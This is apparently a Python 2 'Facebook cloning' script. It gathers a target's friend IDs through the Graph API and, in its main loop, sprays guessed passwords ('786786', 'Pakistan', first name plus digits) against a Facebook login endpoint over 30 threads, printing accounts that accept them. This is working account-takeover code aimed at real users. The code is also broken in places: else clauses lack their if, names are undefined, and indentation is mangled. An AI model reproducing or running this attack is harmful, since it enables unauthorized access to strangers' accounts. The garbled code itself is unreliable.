#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To DemonMati
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
#Dev:DemonMati
##### LOGO #####
logo = """
\033[1;96m ____    ____       _     _________  _____  
\033[1;96m|_   \  /   _|     / \   |  _   _  ||_   _| 
 \033[1;96m |   \/   |      / _ \  |_/ | | \_|  | |   
 \033[1;96m | |\  /| |     / ___ \     | |      | |   
 \033[1;96m_| |_\/_| |_  _/ /   \ \_  _| |_    _| |_  
|\033[1;96m_____||_____||____| |____||_____|  |_____| 
                                           
\033[1;96m«-----------------\033[1;91mDemonMati\033[1;96m-----------------»
\033[1;91m  ┈┈┈◢▇◣◢▇◣┈┈◢▇◣◢▇◣┈┈◢▇◣◢▇◣┈┈┈┈ DemonMati
\033[1;91m  ┈┈┈▇▇▇▇▇▇┈┈▇▇▇▇▇▇┈┈▇▇▇▇▇▇┈┈┈┈ BlackTiger
\033[1;91m  ┈┈┈◥▇▇▇▇◤┈┈◥▇▇▇▇◤┈┈◥▇▇▇▇◤┈┈┈┈Chsami
\033[1;91m  ┈┈┈┈◥▇▇◤┈┈┈┈◥▇▇◤┈┈┈┈◥▇▇◤┈┈┈┈┈   WhatsApp
\033[1;91m  ┈┈-̴̧̬͖͇̟̟̼̱͙̠͉̟̹̘̖̥͈͖͚̯͗͑͌̃̿͗̈̿̿̏͗̑̀̀͘┈┈◥◤┈┈┈-̴̧̬͖͇̟̟̼̱͙̠͉̟̹̘̖̥͈͖͚̯͗͑͌̃̿͗̈̿̿̏͗̑̀̀͘┈┈◥◤┈┈┈-̴̧̬͖͇̟̟̼̱͙̠͉̟̹̘̖̥͈͖͚̯͗͑͌̃̿͗̈̿̿̏͗̑̀̀͘┈┈◥◤┈┈┈-̴̧̬͖͇̟̟̼̱͙̠͉̟̹̘̖̥͈͖͚̯͗͑͌̃̿͗̈̿̿̏͗̑̀̀͘┈┈┈ 03238549941
\033[1;96m«-----------------\033[1;91mDemonMati91mDemonMati a\033[1;96m-----------------»"""   
R = '\033[1;91m'
G = '\033[1;92m'                                
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
S = '\033[1;96m'
W = '\033[1;97m'
######Clear######
def clear():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std #MATI###
def MATI(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

def menu():
    clear()
    os.system('clear')
    print(logo)
    time.sleep(0.05)
    print("\033[1;41m\033[1;37m1   To return to this menu from any Tool   \033[1;0m")
    time.sleep(0.05)
    print("\033[1;41m2\033[1;37m       Stop Process Press CTRL + z        \033[1;0m")
    time.sleep(0.05)
    print("\033[1;41m3\033[1;37m         Type python2 Cloning.py          \033[1;0m")
    time.sleep(0.05)
    print("\033[1;96m[1]  Install With Out Fb Id  Tool      ●")
    time.sleep(0.05)
    print("\033[1;95m[13] Tool Update                       ●")
    time.sleep(0.05)
    print("\033[1;91m[0]  EXIT")
    time.sleep(0.05)
    MATI()
def MATI():
	DEMON = raw_input("\033[1;91m slect option>>>   ")
	if DEMON =="":
		print ("Select a valid option !")
		MATI()
	elif DEMON =="1":
		clear()
		print(logo)
		os.system("ls")
                os.system("cd MATI")
		os.system("cd MATI1")
                love("\033[1;93mTool User Name\033[1;92m Demon\033[1;93m Password \033[1;92mMati")
                time.sleep(6)
                os.system("python2 Mati.py")
	elif DEMON =="2":
	        clear()
	os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print logo14
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[\033[1;93mBack\033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo6
		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[\x1b[1;97mBack\x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo26
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group uncomplet"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m---------------»"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        black()
        elif peak =="5":
	        mafia()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	
			
	def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:love_hacker
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
						else:
							pass3 = y['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
								else:
									pass4 = y['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
												else:
													pass6 = y['first_name'] + y['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														printing append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By DemonMati--•◈•---»" #Dev:DemonMati
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (Back)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;95m/\033[1;91m"+str(len(cekpoint))
	print """
 ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
_________¶¶¶111¶¶___________¶¶111¶¶¶¶________ 
______¶¶¶¶1111¶¶¶____________¶¶¶1111¶¶¶1_____ 
_____¶¶¶1111¶¶¶¶_____________¶¶¶¶11111¶¶¶____ 
___¶¶¶11¶1¶1¶¶¶¶___¶¶____¶¶__¶¶¶¶¶1¶1¶1¶¶¶1__ 
__¶¶¶11¶1¶11¶¶¶¶¶__¶¶¶¶¶¶¶¶__¶¶¶¶¶1¶1¶¶11¶¶1_ 
_¶¶¶11¶¶1¶11¶¶¶¶¶¶__¶¶¶¶¶¶_¶¶¶¶¶¶¶1¶¶1¶¶1¶¶¶_ 
¶¶¶¶1¶¶11¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶1¶¶¶1¶¶¶ 
¶¶¶11¶¶11¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1¶¶¶1¶¶¶ 
¶¶¶1¶¶¶¶1¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶1¶¶¶11¶¶ 
_¶¶11¶¶¶1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1¶¶¶¶1¶¶¶ 
_¶¶¶1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶1¶¶1 
__¶¶1¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶1¶¶¶_ 
___¶¶1¶¶¶_¶¶_______¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶__ 
____¶¶¶¶____________¶¶¶¶¶¶___________¶¶¶¶____ 
______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
_______¶¶¶_________¶______¶_________¶¶¶______
 
 Don't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....MATI THE HACKER....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Num
              \033[1;91m 03238549941"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
        
def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
